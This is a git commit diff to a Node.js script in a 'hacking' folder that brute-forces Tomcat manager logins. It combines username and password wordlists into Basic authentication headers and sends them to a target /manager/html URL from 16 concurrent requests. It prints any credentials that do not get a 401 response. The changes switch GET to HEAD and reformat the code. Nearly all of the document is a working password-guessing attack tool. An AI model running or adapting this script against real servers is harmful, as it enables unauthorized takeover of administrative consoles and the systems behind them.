59f4b435bd41ed1266b04f45677ce4f3b41546da
ayiis <ayiis@126.com>
2015-12-19 10:35:58 +0800

    commit

--- hacking/tomcat_manager_login_brute_force_test.js
+++ hacking/tomcat_manager_login_brute_force_test.js
@@ -4,7 +4,7 @@ var request = require('request');
 var counter = 0;
 var totalCount = 0;
 var authorizationList = [];
-var startTime = (new Date()).getTime();
+var startTime = (new Date).getTime();
 var options = {
     url: null,
     headers: {}
@@ -12,65 +12,62 @@ var options = {
 var maxThread = 16;
 var consoleLength = 80;
 
-var consoleLog = function(str, newLine) {
+var consoleLog = function (str, newLine) {
     var ss = [];
     ss[consoleLength - str.length] = newLine ? '\r\n' : '\033[0G';  // hacked: change line in WINDOWS
     process.stdout.write(str + ss.join(' '));
 }
 
-var readFile = function(fp, cb) {
-    fs.readFile(fp, function(err, data) {
+var readFile = function (fp, cb) {
+    fs.readFile(fp, function (err, data) {
         return cb(data);
     });
 };
 
-var threadFunc = function() {
+var threadFunc = function () {
     var Authorization = authorizationList[--totalCount];
     if (totalCount < 0) {
         if (totalCount === 0 - maxThread) {
             consoleLog('------', true);
-            consoleLog(['Cost time: ', ((new Date()).getTime() - startTime) / 1000].join(''), true);
+            consoleLog(['Cost time: ', ((new Date).getTime() - startTime) / 1000].join(''), true);
             return 1;
+        } else {
+            return 0;
         }
-        return 0;
     }
     options.headers.Authorization = Authorization;
-    request.get(options, function(err, data) {
+    request.head(options, function (err, data) {
         if (data.statusCode != 401) {
             consoleLog(['Good luck: {', data.statusCode, '} ', new Buffer(Authorization.split(' ')[1], 'base64').toString()].join(''), true);
-        }
-        if (--totalCount === 0) {
-            consoleLog('------', true);
-            consoleLog(['Cost time: ', ((new Date()).getTime() - startTime) / 1000].join(''), true);
         }
         return threadFunc();
     });
 }
 
-var callThreadFunc = function() {
+var callThreadFunc = function () {
     for (var i = maxThread; i >= 0; i--) {
         setTimeout(threadFunc, 8 * i);
     }
 }
 
-var lastCount = function() {
+var lastCount = function () {
     if (totalCount > 0) {
-        consoleLog(['Speed: ', counter - totalCount, 'L/S; ', 'Left: ', totalCount].join(''))
+        consoleLog(['Speed: ', counter - totalCount, 'L/S; ', 'Left: ', totalCount].join(''));
         counter = totalCount;
         setTimeout(lastCount, 1000);
     }
 }
 
-var main = function() {
+var main = function () {
     options.url = process.argv[2];
     var usnameFile = process.argv[3];
     var passwdFile = process.argv[4];
     if (!options.url || !usnameFile || !passwdFile) {
-        consoleLog('Usage: node this.js http://127.0.0.1:8080/manager/html usname.txt passwd.txt', true);
+        consoleLog('Usage: tomcat_manager_login_brute_force_test.js http://192.168.152.132:8080/manager/html usname.txt passwd.txt', true);
         return 1;
     }
-    readFile(usnameFile, function(uData) {
-        readFile(passwdFile, function(pData) {
+    readFile(usnameFile, function (uData) {
+        readFile(passwdFile, function (pData) {
             var unameList = uData.toString().split('\r\n');
             var upassList = pData.toString().split('\r\n');
             uData = pData = null;
@@ -82,8 +79,8 @@ var main = function() {
                 consoleLog(['Total count: ', totalCount].join(''), true);
                 consoleLog('------', true);
             }
-            unameList.forEach(function(u, m) {
-                upassList.forEach(function(p, n) {
+            unameList.forEach(function (u, m) {
+                upassList.forEach(function (p, n) {
                     authorizationList.push('Basic ' + new Buffer(u + ':' + p).toString('base64'));
                 });
             });
